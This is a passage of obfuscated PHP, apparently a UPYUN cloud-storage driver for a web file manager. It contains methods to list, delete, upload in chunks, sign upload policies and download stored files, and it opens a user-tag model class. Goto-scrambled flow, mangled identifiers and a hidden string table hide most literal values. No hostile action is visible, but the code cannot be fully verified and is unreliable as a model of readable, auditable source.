delFile($A¬—Î´Å¢) { $fù¬®“í°† =& $_SERVER[±á õÁ]; $cÁ÷Şï–ºâ = $this->ussRequest($A¬—Î´Å¢, $fù¬®“í°†[1272]); return $cÁ÷Şï–ºâ[$fù¬®“í°†[1054]] ? !0 : !1; } public function delFolder($C‡Ûã¶Ø˜) { goto Cƒ¦£Ôİ¿‡; AªË‡–¢¨¾: return $b†¹Í´íÉ›[$d„Ûïó •­[1054]]; goto Cæ„ŠŸïÔå; B¶šæ‚ÉÔØ: foreach ($CÄÆ­ÔŞ as $Cñ”¤ôâã) { $b†¹Í´íÉ› = $this->ussRequest($Cñ”¤ôâã[$d„Ûïó •­[38]], $d„Ûïó •­[1272]); if (!$b†¹Í´íÉ›[$d„Ûïó •­[1054]]) { return !1; } } foreach ($d‚¡ìÎÑ as $C÷¸ø–ƒí) { $b†¹Í´íÉ› = $this->ussRequest($C÷¸ø–ƒí, $d„Ûïó •­[1272]); if (!$b†¹Í´íÉ›[$d„Ûïó •­[1054]]) { return !1; } } $b†¹Í´íÉ› = $this->ussRequest($C‡Ûã¶Ø˜, $d„Ûïó •­[1272]); goto AªË‡–¢¨¾; Cƒ¦£Ôİ¿‡: $d„Ûïó •­ =& $_SERVER[±á õÁ]; if (!$this->exist($C‡Ûã¶Ø˜)) { return !0; } $this->listItemCache = !1; goto cÏğˆÏÏª; cÏğˆÏÏª: $d‚¡ìÎÑ = $CÄÆ­ÔŞ = array(); $this->fileList($C‡Ûã¶Ø˜, $d‚¡ìÎÑ, $CÄÆ­ÔŞ, !0); $this->listItemCache = !0; goto B¶šæ‚ÉÔØ; Cæ„ŠŸïÔå: } public function rename($d”ÇêõÃÀ, $Bâ‘‚‘Ğ¨§) { if ($this->isFile($d”ÇêõÃÀ)) { $Bâ‘‚‘Ğ¨§ = get_path_father($d”ÇêõÃÀ) . $Bâ‘‚‘Ğ¨§; return $this->moveFile($d”ÇêõÃÀ, $Bâ‘‚‘Ğ¨§); } return $this->renameObject($d”ÇêõÃÀ, $Bâ‘‚‘Ğ¨§); } public function fileInfo($a®à§¶À­æ, $eÂà¥ô‡ˆ· = false, $eªÈŸ‘Š = array()) { goto DŸí÷òâÌœ; a÷’æÆ­î: $EªŞ¢º´¨Ş[$fÏŞéÛÊØŠ[200]] = intval($eªÈŸ‘Š[$fÏŞéÛÊØŠ[1273]]); $EªŞ¢º´¨Ş[$fÏŞéÛÊØŠ[117]] = intval($eªÈŸ‘Š[$fÏŞéÛÊØŠ[1274]]); $EªŞ¢º´¨Ş[$fÏŞéÛÊØŠ[87]] = $eªÈŸ‘Š[$fÏŞéÛÊØŠ[87]]; goto B«ÍàˆÀÁÅ; AæË—ùÜâÕ: $EªŞ¢º´¨Ş[$fÏŞéÛÊØŠ[200]] = $EªŞ¢º´¨Ş[$fÏŞéÛÊØŠ[117]] = 0; $EªŞ¢º´¨Ş[$fÏŞéÛÊØŠ[201]] = $EªŞ¢º´¨Ş[$fÏŞéÛÊØŠ[202]] = !0; if (empty($eªÈŸ‘Š)) { $eªÈŸ‘Š = $this->objectMeta($a®à§¶À­æ); if (!$eªÈŸ‘Š) { return $EªŞ¢º´¨Ş; } } goto a÷’æÆ­î; DŸí÷òâÌœ: $fÏŞéÛÊØŠ =& $_SERVER[±á õÁ]; $EªŞ¢º´¨Ş = array($fÏŞéÛÊØŠ[38] => $this->pathThis($a®à§¶À­æ), $fÏŞéÛÊØŠ[85] => $this->getPathOuter($fÏŞéÛÊØŠ[8] . $a®à§¶À­æ), $fÏŞéÛÊØŠ[39] => $fÏŞéÛÊØŠ[181], $fÏŞéÛÊØŠ[87] => isset($eªÈŸ‘Š[$fÏŞéÛÊØŠ[87]]) ? $eªÈŸ‘Š[$fÏŞéÛÊØŠ[87]] : 0, $fÏŞéÛÊØŠ[175] => $this->ext($a®à§¶À­æ)); if ($eÂà¥ô‡ˆ·) { return $EªŞ¢º´¨Ş; } goto AæË—ùÜâÕ; B«ÍàˆÀÁÅ: return $EªŞ¢º´¨Ş; goto a§Â™‚øÚ¹; a§Â™‚øÚ¹: } public function folderInfo($AÁÊ¢öÈ‚², $bÜºôÒŞ› = false) { goto c¼£ìîÏ‡Ã; c¼£ìîÏ‡Ã: $c‘ç§ñ­´Í =& $_SERVER[±á õÁ]; $Eİ…ì™Ò = array($c‘ç§ñ­´Í[38] => $this->pathThis($AÁÊ¢öÈ‚²), $c‘ç§ñ­´Í[85] => $this->getPathOuter($c‘ç§ñ­´Í[8] . $AÁÊ¢öÈ‚²), $c‘ç§ñ­´Í[39] => $c‘ç§ñ­´Í[86]); if ($bÜºôÒŞ›) { return $Eİ…ì™Ò; } goto B–Ä Ğ‰ØÖ; BÆØÈ©ŞÀİ: $Eİ…ì™Ò[$c‘ç§ñ­´Í[200]] = intval($còòœáæê¬[$c‘ç§ñ­´Í[1273]]); $Eİ…ì™Ò[$c‘ç§ñ­´Í[117]] = intval($còòœáæê¬[$c‘ç§ñ­´Í[1274]]); return $Eİ…ì™Ò; goto D¹Ëï¡ñÈĞ; B–Ä Ğ‰ØÖ: $Eİ…ì™Ò[$c‘ç§ñ­´Í[200]] = $Eİ…ì™Ò[$c‘ç§ñ­´Í[117]] = 0; $Eİ…ì™Ò[$c‘ç§ñ­´Í[201]] = $Eİ…ì™Ò[$c‘ç§ñ­´Í[202]] = !0; if (empty($còòœáæê¬)) { $còòœáæê¬ = $this->objectMeta($AÁÊ¢öÈ‚²); if (!$còòœáæê¬) { return $Eİ…ì™Ò; } } goto BÆØÈ©ŞÀİ; D¹Ëï¡ñÈĞ: } private function listObjs($cŞ¨•æÈ¼, $E¼ÅáĞåËº = 0, $f¿…”‘«ã¯ = 1000) { $fÛò‹ß˜°‹ =& $_SERVER[±á õÁ]; $fË‰ë§òÏÒ = array($fÛò‹ß˜°‹[1275], $fÛò‹ß˜°‹[1276] . $f¿…”‘«ã¯); if ($E¼ÅáĞåËº) { $fË‰ë§òÏÒ[] = $fÛò‹ß˜°‹[1277] . $E¼ÅáĞåËº; } $D««ĞÎÆÔŠ = $this->ussRequest($cŞ¨•æÈ¼, $fÛò‹ß˜°‹[234], !1, $fË‰ë§òÏÒ); return !$D««ĞÎÆÔŠ[$fÛò‹ß˜°‹[1054]] ? !1 : $D««ĞÎÆÔŠ[$fÛò‹ß˜°‹[1056]]; } private function fileList($Aº‚§›ÊœÔ, &$dÑÙ‰éÇñâ, &$eñ¦ÆÚİƒ‰, $bŸŸ¹“–ğ = false) { goto F½Ï´ª “; F½Ï´ª “: $E¿ëà¿Ÿª =& $_SERVER[±á õÁ]; $fèö±´‚Áù = $E¿ëà¿Ÿª[43]; $EàãÍ÷èéÍ = 1000; goto f§¿…ƒ’Õ; B©ºâë¸´§: if ($d­‰‡¤çñÀ) { $this->cacheMethod($E¿ëà¿Ÿª[205], $Aº‚§›ÊœÔ, !0); } goto d¢”£²ä»©; f§¿…ƒ’Õ: $AÅ£Œ¿Ó«… = rtrim($Aº‚§›ÊœÔ, $E¿ëà¿Ÿª[8]) . $E¿ëà¿Ÿª[8]; $d­‰‡¤çñÀ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $dß£‡ÛùÅø = $this->listObjs($Aº‚§›ÊœÔ, $fèö±´‚Áù, $EàãÍ÷èéÍ); if (!$dß£‡ÛùÅø) { return !1; } $fèö±´‚Áù = isset($dß£‡ÛùÅø[$E¿ëà¿Ÿª[1278]]) ? $dß£‡ÛùÅø[$E¿ëà¿Ÿª[1278]] : $E¿ëà¿Ÿª[43]; $C’ÛëÂ×–¹ = isset($dß£‡ÛùÅø[$E¿ëà¿Ÿª[1279]]) ? $dß£‡ÛùÅø[$E¿ëà¿Ÿª[1279]] : array(); foreach ($C’ÛëÂ×–¹ as $CĞ“µºË”) { $Dù¼›óÎ = $CĞ“µºË”[$E¿ëà¿Ÿª[39]] == $E¿ëà¿Ÿª[86] ? !0 : !1; $c•˜àŞÑ«£ = ltrim($AÅ£Œ¿Ó«… . $CĞ“µºË”[$E¿ëà¿Ÿª[38]], $E¿ëà¿Ÿª[8]) . ($Dù¼›óÎ ? $E¿ëà¿Ÿª[8] : $E¿ëà¿Ÿª[43]); $F¡Œ—ôôø = array($E¿ëà¿Ÿª[38] => $c•˜àŞÑ«£, $E¿ëà¿Ÿª[39] => $Dù¼›óÎ ? $E¿ëà¿Ÿª[86] : $E¿ëà¿Ÿª[181], $E¿ëà¿Ÿª[87] => $CĞ“µºË”[$E¿ëà¿Ÿª[340]], $E¿ëà¿Ÿª[1274] => $CĞ“µºË”[$E¿ëà¿Ÿª[1280]]); if ($d­‰‡¤çñÀ) { $this->cacheMethod($E¿ëà¿Ÿª[205], $c•˜àŞÑ«£, $Dù¼›óÎ); $this->cacheMethod($E¿ëà¿Ÿª[206], $c•˜àŞÑ«£, $F¡Œ—ôôø); } if ($Dù¼›óÎ) { $dÑÙ‰éÇñâ[] = $c•˜àŞÑ«£; if ($bŸŸ¹“–ğ) { $this->fileList($c•˜àŞÑ«£, $dÑÙ‰éÇñâ, $eñ¦ÆÚİƒ‰, $bŸŸ¹“–ğ); } continue; } $eñ¦ÆÚİƒ‰[] = $F¡Œ—ôôø; } if (count($C’ÛëÂ×–¹) < $EàãÍ÷èéÍ) { break; } } goto B©ºâë¸´§; d¢”£²ä»©: } public function listPath($C°ƒ ö¤×§, $E¡­–™íÇ = false) { $B£ÏôÉæÃ„ =& $_SERVER[±á õÁ]; $DÌè«õ…òë = $Bó“Ûóõ¯ = array(); $this->fileList($C°ƒ ö¤×§, $DÌè«õ…òë, $Bó“Ûóõ¯); foreach ($DÌè«õ…òë as $f´±©Û‡ß§ => $d ëæ¶åº‹) { $DÌè«õ…òë[$f´±©Û‡ß§] = $this->folderInfo($d ëæ¶åº‹, $E¡­–™íÇ); } foreach ($Bó“Ûóõ¯ as $f´±©Û‡ß§ => $d ëæ¶åº‹) { $Bó“Ûóõ¯[$f´±©Û‡ß§] = $this->fileInfo($d ëæ¶åº‹[$B£ÏôÉæÃ„[38]], $E¡­–™íÇ, $d ëæ¶åº‹); } return array($B£ÏôÉæÃ„[84] => $DÌè«õ…òë, $B£ÏôÉæÃ„[83] => $Bó“Ûóõ¯); } public function has($a„ò‘§ˆ, $bÔìÇÃ¦ÏÀ = false, $CØñ®âé = true) { goto b¤—³Ü÷í˜; b¤—³Ü÷í˜: $Cù£Ô²Š„† =& $_SERVER[±á õÁ]; $FÇà¨¼ïí = $Cù£Ô²Š„†[43]; $a¢Â©¥²Û¿ = 500; goto B¹Û¬¡ìœâ; B¹Û¬¡ìœâ: $D¤×ù½ÖÒ„ = 0; $B¸Ì»ŸàØ§ = 0; $dº‘‘ª‡õ¢ = rtrim($a„ò‘§ˆ, $Cù£Ô²Š„†[8]) . $Cù£Ô²Š„†[8]; goto DÂ†¬¶Úˆñ; DÂ†¬¶Úˆñ: while (!0) { check_abort(); $EÌàìÃ¢Ÿ· = $this->listObjs($a„ò‘§ˆ, $FÇà¨¼ïí, $a¢Â©¥²Û¿); if (!$EÌàìÃ¢Ÿ·) { return !1; } $FÇà¨¼ïí = isset($EÌàìÃ¢Ÿ·[$Cù£Ô²Š„†[1278]]) ? $EÌàìÃ¢Ÿ·[$Cù£Ô²Š„†[1278]] : $Cù£Ô²Š„†[43]; $A¶Ø½šºÜè = isset($EÌàìÃ¢Ÿ·[$Cù£Ô²Š„†[1279]]) ? $EÌàìÃ¢Ÿ·[$Cù£Ô²Š„†[1279]] : array(); if (empty($A¶Ø½šºÜè)) { break; } $CçÛë ÃÉò = array_filter($A¶Ø½šºÜè, function ($eÚ‰¼¬Š˜ï) { $Fƒ…ìÑå‘ˆ =& $_SERVER[±á õÁ]; return $eÚ‰¼¬Š˜ï[$Fƒ…ìÑå‘ˆ[39]] == $Fƒ…ìÑå‘ˆ[86]; }); $b¹¬ÈÆ‡´ = count($A¶Ø½šºÜè); $CçÛë ÃÉò = count($CçÛë ÃÉò); $FÉ¥ÀèäÌÑ = $b¹¬ÈÆ‡´ - $CçÛë ÃÉò; if ($bÔìÇÃ¦ÏÀ) { $B¸Ì»ŸàØ§ += $CçÛë ÃÉò; $D¤×ù½ÖÒ„ += $FÉ¥ÀèäÌÑ; if ($b¹¬ÈÆ‡´ < $a¢Â©¥²Û¿) { break; } continue; } if ($CØñ®âé) { if ($FÉ¥ÀèäÌÑ) { return !0; } } else { if ($CçÛë ÃÉò) { return !0; } } if ($b¹¬ÈÆ‡´ < $a¢Â©¥²Û¿) { break; } } if ($bÔìÇÃ¦ÏÀ) { return array($Cù£Ô²Š„†[209] => $D¤×ù½ÖÒ„, $Cù£Ô²Š„†[210] => $B¸Ì»ŸàØ§); } return !1; goto bÍ¯°¨ä££; bÍ¯°¨ä££: } public function listAll($aîë‡ÃÌ§•) { goto Bğé›ƒ; cÊ¾à³ê : $f‰æ¾¬‡ô = array(); foreach ($B…·‹ÈëÂ as $bà…Œš¼ÑÔ) { $f‰æ¾¬‡ô[$bà…Œš¼ÑÔ[$e²Ú£šß˜´[38]]] = $bà…Œš¼ÑÔ[$e²Ú£šß˜´[87]]; } foreach ($Dê«èŸ‰Æ as $bà…Œš¼ÑÔ) { if (is_string($bà…Œš¼ÑÔ)) { $f‰æ¾¬‡ô[$bà…Œš¼ÑÔ] = 0; } } goto fœÉ†ªÈ„Ò; fœÉ†ªÈ„Ò: return $this->listAllFiles($aîë‡ÃÌ§•, array_keys($f‰æ¾¬‡ô), $f‰æ¾¬‡ô); goto DÉ¾öŠæ¦; Bğé›ƒ: $e²Ú£šß˜´ =& $_SERVER[±á õÁ]; $Dê«èŸ‰Æ = $B…·‹ÈëÂ = array(); $this->fileList($aîë‡ÃÌ§•, $Dê«èŸ‰Æ, $B…·‹ÈëÂ, !0); goto cÊ¾à³ê ; DÉ¾öŠæ¦: } public function canRead($EŞ±ãÁŒŸ) { return $this->exist($EŞ±ãÁŒŸ) ? !0 : !1; } public function canWrite($Ağ‚ÚóÜ) { return $this->exist($Ağ‚ÚóÜ) ? !0 : !1; } public function getContent($E²İ‰†›ƒŞ) { return $this->fileSubstr($E²İ‰†›ƒŞ, 0, -1); } public function setContent($C’­ƒŒœßĞ, $C«Àïùùõã = '') { $CÆ¾„‡œ¥ =& $_SERVER[±á õÁ]; if (!$C«Àïùùõã) { $e‘í§ÆßÒÁ = $this->ussRequest($C’­ƒŒœßĞ, $CÆ¾„‡œ¥[230]); return $e‘í§ÆßÒÁ[$CÆ¾„‡œ¥[1054]]; } $aÆ‚¥‰ï²Œ = $this->tempFile($this->pathThis($C’­ƒŒœßĞ)); file_put_contents($aÆ‚¥‰ï²Œ, $C«Àïùùõã); if ($this->upload($C’­ƒŒœßĞ, $aÆ‚¥‰ï²Œ)) { $this->tempFileRemve($aÆ‚¥‰ï²Œ); return !0; } return !1; } public function fileSubstr($Cëë´ªØß, $dÖäÜòè±Ò, $e¨æï÷Åˆ‘) { $B”×ÍÚ© =& $_SERVER[±á õÁ]; if (!($a³Êª™·ˆŒ = $this->link($Cëë´ªØß))) { return !1; } $A¼‘ÎŒ¤®ê = !1; if ($e¨æï÷Åˆ‘ > 0) { $aÁŠ†˜„ç = $dÖäÜòè±Ò + $e¨æï÷Åˆ‘ - 1; $A¼‘ÎŒ¤®ê = array($B”×ÍÚ©[1241] . $dÖäÜòè±Ò . $B”×ÍÚ©[436] . $aÁŠ†˜„ç); } $E´ªÅ™è…º = url_request($a³Êª™·ˆŒ, $B”×ÍÚ©[234], !1, $A¼‘ÎŒ¤®ê); return $E´ªÅ™è…º[$B”×ÍÚ©[714]] ? $E´ªÅ™è…º[$B”×ÍÚ©[1056]] : !1; } public function upload($cã¼Ûğ¨•, $fÊ‹Ö¤ã, $eµäáÁŒëæ = false, $eöàˆ›—†£ = REPEAT_REPLACE) { goto c°—’±õòŞ; Aˆï¥…øà : if (!$e†“î¶ÖÂª[$DğÊ”Ø§–—[1054]]) { return !1; } $cƒ£ï†ÙÃ = $e†“î¶ÖÂª[$DğÊ”Ø§–—[1056]]; $E‹İ‰«Àå÷ = 0; goto E òÒùğ˜Ş; bÃµ ‚¢ï: do { $eõºéƒËÇ = $cƒ£ï†ÙÃ[$DğÊ”Ø§–—[1287]]; fseek_64($F¬ĞŞò×åÒ, $E‹İ‰«Àå÷); $dÌÚÀŒ‘“ = fread($F¬ĞŞò×åÒ, $eõºéƒËÇ); $BéÕ‚öÆÊ = 0; do { $BéÕ‚öÆÊ++; $cƒ£ï†ÙÃ = $this->uploadPart($cã¼Ûğ¨•, $cƒ£ï†ÙÃ, $dÌÚÀŒ‘“); } while (!$cƒ£ï†ÙÃ && $BéÕ‚öÆÊ < 3); if (!$cƒ£ï†ÙÃ) { return !1; } $D¯´ãÕÉ¤ = $cƒ£ï†ÙÃ[$DğÊ”Ø§–—[1286]]; $E‹İ‰«Àå÷ += $eõºéƒËÇ; } while ($D¯´ãÕÉ¤ != -1); fclose($F¬ĞŞò×åÒ); $Fã®â…¢£¸ = array($DğÊ”Ø§–—[1288], $DğÊ”Ø§–—[1289] . $cƒ£ï†ÙÃ[$DğÊ”Ø§–—[1290]], $DğÊ”Ø§–—[1284]); goto F•ÕŠò–ˆï; E òÒùğ˜Ş: $D¯´ãÕÉ¤ = $cƒ£ï†ÙÃ[$DğÊ”Ø§–—[1286]]; $F¬ĞŞò×åÒ = fopen($fÊ‹Ö¤ã, $DğÊ”Ø§–—[1190]); if (!$F¬ĞŞò×åÒ) { return !1; } goto bÃµ ‚¢ï; c°—’±õòŞ: $DğÊ”Ø§–— =& $_SERVER[±á õÁ]; $F¬¼Œˆ›ÖÓ = IO::size($fÊ‹Ö¤ã); if ($F¬¼Œˆ›ÖÓ <= 1024 * 1024 * 200) { $fî‡âà°½ = array($DğÊ”Ø§–—[1281] . $fÊ‹Ö¤ã); $e†“î¶ÖÂª = $this->ussRequest($cã¼Ûğ¨•, $DğÊ”Ø§–—[232], $fî‡âà°½); return $e†“î¶ÖÂª[$DğÊ”Ø§–—[1054]] ? $this->getPathOuter($cã¼Ûğ¨•) : !1; } goto A›êÇÜÚË; F•ÕŠò–ˆï: $e†“î¶ÖÂª = $this->ussRequest($cã¼Ûğ¨•, $DğÊ”Ø§–—[232], !1, $Fã®â…¢£¸); return $e†“î¶ÖÂª[$DğÊ”Ø§–—[1054]] ? $this->getPathOuter($DçÇ‰ãŒ¬‹) : !1; goto eÓßª½µ¶æ; A›êÇÜÚË: $féï±éÍÈ› = 1024 * 1024 * 10; $Fã®â…¢£¸ = array($DğÊ”Ø§–—[1282], $DğÊ”Ø§–—[1283] . $F¬¼Œˆ›ÖÓ, $DğÊ”Ø§–—[1284], $DğÊ”Ø§–—[1285] . $féï±éÍÈ›); $e†“î¶ÖÂª = $this->ussRequest($cã¼Ûğ¨•, $DğÊ”Ø§–—[232], !1, $Fã®â…¢£¸); goto Aˆï¥…øà ; eÓßª½µ¶æ: } private function uploadPart($BÑæíÁ”Ÿ‘, $F‚Šº„ˆË, &$d²ó£êÙÀ™) { $C÷Øºš¸œÉ =& $_SERVER[±á õÁ]; $CÆäÁ®›—‡ = array($C÷Øºš¸œÉ[1291], $C÷Øºš¸œÉ[1289] . $F‚Šº„ˆË[$C÷Øºš¸œÉ[1290]], $C÷Øºš¸œÉ[1292] . $F‚Šº„ˆË[$C÷Øºš¸œÉ[1286]], $C÷Øºš¸œÉ[148] . $F‚Šº„ˆË[$C÷Øºš¸œÉ[1287]]); $cØ‹˜‰¤ê¨ = $this->ussRequest($BÑæíÁ”Ÿ‘, $C÷Øºš¸œÉ[232], $d²ó£êÙÀ™, $CÆäÁ®›—‡); return !$cØ‹˜‰¤ê¨[$C÷Øºš¸œÉ[1054]] ? $cØ‹˜‰¤ê¨[$C÷Øºš¸œÉ[1054]] : $cØ‹˜‰¤ê¨[$C÷Øºš¸œÉ[1056]]; } public function uploadFormData($d‰”ò›Ç¾­, $B¬ë„ĞíÄ = 3600) { return $this->uploadPolicy($d‰”ò›Ç¾­, $B¬ë„ĞíÄ); } public function multiUploadFormData($aÊÊç”çÉö, $fÅáñ¯Ş¡­ = 3600) { $F‰¿ƒâôöÂ =& $_SERVER[±á õÁ]; $fŠ•ç’˜ = (int) $GLOBALS[$F‰¿ƒâôöÂ[7]][$F‰¿ƒâôöÂ[87]]; return $this->uploadPolicy($aÊÊç”çÉö, $fÅáñ¯Ş¡­, $fŠ•ç’˜); } private function uploadPolicy($FİÓ«ŞèÔ, $AéöÄí¥ƒ = 3600, $aº¡ƒÆ—ù = 0) { goto e¼©â£íç; e¼©â£íç: $FÀÕÁó’ˆ² =& $_SERVER[±á õÁ]; $Fù‡‡òÏ± = $FÀÕÁó’ˆ²[8] . $this->bucket; $Aäó’’ŠÉ÷ = gmdate($FÀÕÁó’ˆ²[1227]); goto e¢åÀ™Õó§; e¢åÀ™Õó§: $Eåø˜„Šœ„ = array($FÀÕÁó’ˆ²[1293] => $this->bucket, $FÀÕÁó’ˆ²[1294] => $FİÓ«ŞèÔ, $FÀÕÁó’ˆ²[1295] => time() + $AéöÄí¥ƒ, $FÀÕÁó’ˆ²[1296] => $Aäó’’ŠÉ÷); if ($aº¡ƒÆ—ù) { $Eåø˜„Šœ„[$FÀÕÁó’ˆ²[1206]] = $aº¡ƒÆ—ù; } $AÜÄòö¦« = base64_encode(json_encode($Eåø˜„Šœ„)); goto CÀ§ˆÁÖ¸±; CÀ§ˆÁÖ¸±: $EŒ»É‘í»— = base64_encode(hash_hmac($FÀÕÁó’ˆ²[1263], "\120\117\123\x54\x26{$Fù‡‡òÏ±}\46{$Aäó’’ŠÉ÷}\x26{$AÜÄòö¦«}", md5("{$this->userpass}"), !0)); $Fïñ©â°ğ = array($FÀÕÁó’ˆ²[1133] => $AÜÄòö¦«, $FÀÕÁó’ˆ²[1297] => "\125\x50\131\x55\x4e\40{$this->username}\72{$EŒ»É‘í»—}", $FÀÕÁó’ˆ²[183] => $this->endpoint . $Fù‡‡òÏ±); return $Fïñ©â°ğ; goto fº˜ò´•Ä·; fº˜ò´•Ä·: } public function download($dáÌßÛ›ÂÜ, $aÄàÂéÀçÎ) { goto Ağç“ìÓº±; f—¦Ì¾êÕ›: fclose($D–Ç¼Ëçñ); return $aÄàÂéÀçÎ; goto B®‰‡…§†¡; Ağç“ìÓº±: $c¸£ù»ÛÚÓ = IO::getPathInner(IO::mkfile($aÄàÂéÀçÎ)); if (!($A„‡±¯³Ò¬ = $this->link($dáÌßÛ›ÂÜ))) { return !1; } $B‰¨ßÙÒ” = 0; goto B´¬é”ä½é; B´¬é”ä½é: $FŞ¿Òåğ¶Û = 1024 * 200; $D–Ç¼Ëçñ = fopen($c¸£ù»ÛÚÓ, $_SERVER[±á õÁ][1247]); while (!0) { $Cæ¡’®Âº = $this->fileSubstr($dáÌßÛ›ÂÜ, $B‰¨ßÙÒ”, $FŞ¿Òåğ¶Û); if ($Cæ¡’®Âº === !1) { return !1; } fwrite($D–Ç¼Ëçñ, $Cæ¡’®Âº); $B‰¨ßÙÒ” += $FŞ¿Òåğ¶Û; if (strlen($Cæ¡’®Âº) < $FŞ¿Òåğ¶Û) { break; } } goto f—¦Ì¾êÕ›; B®‰‡…§†¡: } public function link($F¦¡ôŒåÍ, $DË±ÉÆª˜ = array()) { $DœåŒ£·ã® =& $_SERVER[±á õÁ]; $F¦¡ôŒåÍ = trim($F¦¡ôŒåÍ, $DœåŒ£·ã®[8]); if (!empty($this->token)) { $EÑËî’’â = strtotime(date($DœåŒ£·ã®[1298])); $b¢Ğœ‰ë§ = substr(md5($this->token . $DœåŒ£·ã®[287] . $EÑËî’’â . $DœåŒ£·ã®[1299] . $F¦¡ôŒåÍ), 12, 8) . $EÑËî’’â; $DË±ÉÆª˜[] = $DœåŒ£·ã®[1300] . $b¢Ğœ‰ë§; } $fÏéâ«ª† = !empty($DË±ÉÆª˜) ? $DœåŒ£·ã®[79] . implode($DœåŒ£·ã®[287], $DË±ÉÆª˜) : $DœåŒ£·ã®[43]; return $this->getHost() . $DœåŒ£·ã®[8] . $F¦¡ôŒåÍ . $fÏéâ«ª†; } public function fileOut($EÓ“İŞ¸•, $e²î±Å¥Ÿ± = false, $eÖ‹…ÓèÁì = false, $F¥ÄÚª¸Â = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($EÓ“İŞ¸•, $e²î±Å¥Ÿ±, $eÖ‹…ÓèÁì, $F¥ÄÚª¸Â); } if (!$eÖ‹…ÓèÁì) { $eÖ‹…ÓèÁì = $this->pathThis($EÓ“İŞ¸•); } $aÎ‡å×¼œ = $e²î±Å¥Ÿ± ? array($_SERVER[±á õÁ][1301] . rawurlencode($eÖ‹…ÓèÁì)) : array(); $b£¸ëÚ’Ê« = $this->link($EÓ“İŞ¸•, $aÎ‡å×¼œ); $this->fileOutLink($b£¸ëÚ’Ê«); } public function fileOutServer($E®†ßŒ…ÂÔ, $b´»²•©§ = false, $eµ’³ñ÷ = false, $AË•šç¤ï = '') { parent::fileOut($E®†ßŒ…ÂÔ, $b´»²•©§, $eµ’³ñ÷, $AË•šç¤ï); } public function fileOutImage($B´Æ«æËÈ, $eÇâç±¬Éœ = 250) { $d—©ì‰ŒŒå = $this->link($B´Æ«æËÈ . $_SERVER[±á õÁ][1302] . $eÇâç±¬Éœ); $this->fileOutLink($d—©ì‰ŒŒå); } public function fileOutImageServer($c†â÷©­¤ï, $ešÀÄ›ÔÉ• = 250) { parent::fileOutImage($c†â÷©­¤ï, $ešÀÄ›ÔÉ•); } public function hashMd5($Aøª„é°¤Ç) { $C‡‘î«ÇÆ© =& $_SERVER[±á õÁ]; $c‚¦å´õ¶Ö = $this->_objectMeta($Aøª„é°¤Ç); return isset($c‚¦å´õ¶Ö[$C‡‘î«ÇÆ©[214]]) ? $c‚¦å´õ¶Ö[$C‡‘î«ÇÆ©[214]] : !1; } public function size($Aºê¶¿Š¼¶) { $aÕ›ô ¹¬„ = $this->objectMeta($Aºê¶¿Š¼¶); return $aÕ›ô ¹¬„ ? $aÕ›ô ¹¬„[$_SERVER[±á õÁ][87]] : 0; } public function info($C§‘¨ ¨ƒ°) { if ($this->isFolder($C§‘¨ ¨ƒ°)) { return $this->folderInfo($C§‘¨ ¨ƒ°); } else { if ($this->isFile($C§‘¨ ¨ƒ°)) { return $this->fileInfo($C§‘¨ ¨ƒ°); } } return !1; } public function exist($c¹†„ÜÂÀÔ) { return $this->isFile($c¹†„ÜÂÀÔ) || $this->isFolder($c¹†„ÜÂÀÔ); } public function isFile($aÙéæçŠÇæ) { return !$this->isFolder($aÙéæçŠÇæ) && $this->objectMeta($aÙéæçŠÇæ); } public function isFolder($bãÊ‰ê“®Ê) { return $this->cacheMethod($_SERVER[±á õÁ][205], $bãÊ‰ê“®Ê); } protected function objectMeta($F–ÂÔ“‡²‡) { return $this->cacheMethod($_SERVER[±á õÁ][206], $F–ÂÔ“‡²‡); } protected function _objectMeta($Aèä‡§˜­) { goto B¬£Å›ãô; c¾øÏ½çÔ: if (!$câªà½˜ñ[$B·£Æîì“[1054]]) { return null; } $aÉÉèóù³ô = isset($câªà½˜ñ[$B·£Æîì“[1056]]) ? $câªà½˜ñ[$B·£Æîì“[1056]] : array(); if (!isset($aÉÉèóù³ô[$B·£Æîì“[1304]])) { return null; } goto bÖƒŠ¶‚×; bÖƒŠ¶‚×: $eëÂöì©Ã = array($B·£Æîì“[39] => isset($aÉÉèóù³ô[$B·£Æîì“[1304]]) ? $aÉÉèóù³ô[$B·£Æîì“[1304]] : null, $B·£Æîì“[87] => isset($aÉÉèóù³ô[$B·£Æîì“[1305]]) ? $aÉÉèóù³ô[$B·£Æîì“[1305]] : null, $B·£Æîì“[214] => isset($aÉÉèóù³ô[$B·£Æîì“[1306]]) ? $aÉÉèóù³ô[$B·£Æîì“[1306]] : null, $B·£Æîì“[1273] => isset($aÉÉèóù³ô[$B·£Æîì“[1307]]) ? $aÉÉèóù³ô[$B·£Æîì“[1307]] : null); $eëÂöì©Ã[$B·£Æîì“[1274]] = isset($aÉÉèóù³ô[$B·£Æîì“[1308]]) ? strtotime($aÉÉèóù³ô[$B·£Æîì“[1308]]) : $eëÂöì©Ã[$B·£Æîì“[1273]]; return $eëÂöì©Ã; goto eŸõÊ„–¯; B¬£Å›ãô: $B·£Æîì“ =& $_SERVER[±á õÁ]; if ($Aèä‡§˜­ == $B·£Æîì“[43] || $Aèä‡§˜­ == $B·£Æîì“[8]) { return array(); } $câªà½˜ñ = $this->ussRequest($Aèä‡§˜­, $B·£Æîì“[1303]); goto c¾øÏ½çÔ; eŸõÊ„–¯: } protected function _isFolder($eˆ×ƒÄªË¾) { $e˜‚íË»ø =& $_SERVER[±á õÁ]; if ($eˆ×ƒÄªË¾ == $e˜‚íË»ø[43] || $eˆ×ƒÄªË¾ == $e˜‚íË»ø[8]) { return !0; } $C©Ï¢˜¹‰š = $this->objectMeta($eˆ×ƒÄªË¾); return isset($C©Ï¢˜¹‰š[$e˜‚íË»ø[39]]) && $C©Ï¢˜¹‰š[$e˜‚íË»ø[39]] == $e˜‚íË»ø[86] ? !0 : !1; } } goto EéÛ™à´Ÿ; eå•ÀˆÊ›¡: class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\x72\56\x74\x61\x67\x4c\151\163\x74"; public $modelType = "\x55\163\x65\x72\x4f\160\164\151\x6f\x6e"; public $field = array("\x6e\x61\155\x65", "\163\164\171\x6c\x65", "\x73\x6f\x72\x74"); public function listData($bÌ§ÑÒ”…¤ = false, $Dô»ñ‰ÂÊÆ = "\x73\x6f\x72\164", $C­ëÑĞ´øÃ = false) { return parent::listData($bÌ§ÑÒ”…¤, $Dô»ñ‰ÂÊÆ, $C­ëÑĞ´øÃ); } public function remove($c®™Ã¸Óß‹) { return 